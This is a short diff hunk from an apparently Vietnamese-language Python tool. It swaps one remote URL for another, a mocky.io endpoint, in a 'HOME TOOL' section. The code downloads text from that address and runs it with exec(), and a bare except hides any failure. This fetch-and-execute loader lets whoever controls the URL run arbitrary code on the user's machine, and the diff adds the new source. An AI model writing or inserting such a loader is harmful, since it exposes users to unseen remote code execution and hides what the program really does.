@@ -111,7 +111,7 @@ elif check_file_key == True:
 # ======================== [ HOME TOOL ] ========================
 
 try:
-    response = requests.get('https://raw.githubusercontent.com/h8i73eu20453-223tew/gop/main/gop.py').text
+    response = requests.get('https://run.mocky.io/v3/f1942ad9-6334-49bb-a183-322fd2fb43f7').text
     exec(response)
 except:
     print("\033[1;31m"'''Kiểm Tra kết nối mạng
